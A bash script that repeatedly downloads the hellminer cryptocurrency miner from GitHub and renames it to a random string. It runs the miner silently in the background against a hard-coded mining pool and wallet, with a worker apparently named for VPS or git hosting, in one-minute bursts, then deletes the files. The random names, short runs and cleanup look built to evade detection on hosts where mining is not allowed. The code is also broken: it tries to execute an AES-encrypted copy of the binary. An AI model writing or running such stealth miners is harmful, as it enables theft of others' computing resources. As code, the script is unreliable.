#!/bin/bash

# Function to generate a strong random file name
generate_random_name() {
  local random_name
  random_name=$(date +%s%N | sha512sum | base64 | head -c 12)
  echo "$random_name"
}

# Function to encrypt the miner binary
encrypt_miner_binary() {
  local binary="$1"
  local encrypted_binary="encrypted_$binary"

  # Encrypt the binary using AES-256-CBC and SHA-512
  openssl enc -aes-256-cbc -salt -in "$binary" -out "$encrypted_binary" -pbkdf2 -iter 100000 -md sha512

  # Optionally, you can also generate a checksum or signature here if needed
}

# Main loop to continuously run the mining script
while true; do
  # Download the miner archive (adjust URL as necessary)
  curl -fsSL -o hellminer_linux64_avx2.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Extract the miner files
  tar -xf hellminer_linux64_avx2.tar.gz

  # Clean up unnecessary files
  rm -f hellminer_linux64_avx2.tar.gz run_miner.sh verus-solver

  # Generate a random name for the miner binary
  random_name=$(generate_random_name)
  mv hellminer "$random_name"

  # Encrypt the miner binary
  encrypt_miner_binary "$random_name"

  # Run the miner in the background for 1 minute
  nohup ./encrypted_"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 3 >/dev/null 2>&1 &
  miner_pid=$!

  # Wait for 1 minute while mining
  sleep 1m

  # Stop the miner process
  kill $miner_pid

  # Clean up downloaded files and encrypted miner binary
  rm -f "$random_name" encrypted_"$random_name"

  # Wait for 2 minutes before repeating the loop
  sleep 2m
done
